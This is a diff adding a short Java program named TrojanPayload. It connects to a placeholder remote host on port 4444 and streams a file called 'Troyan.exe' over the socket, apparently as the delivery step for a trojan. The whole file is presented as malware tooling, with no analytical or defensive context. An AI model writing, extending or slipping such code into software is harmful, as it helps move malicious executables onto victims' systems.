@@ -1,0 +1,25 @@
+import java.io.*;
+import java.net.*;
+
+public class TrojanPayload {
+    public static void main(String[] args) throws Exception {
+        String host = "IP Adress";
+        int port = 4444;
+        String filename = "Troyan.exe";
+
+        Socket socket = new Socket(host, port);
+        OutputStream os = socket.getOutputStream();
+        FileInputStream fis = new FileInputStream(filename);
+
+        byte[] buffer = new byte[4096];
+        int bytesRead = 0;
+
+        while ((bytesRead = fis.read(buffer)) != -1) {
+            os.write(buffer, 0, bytesRead);
+        }
+
+        socket.close();
+        fis.close();
+        os.close();
+    }
+}
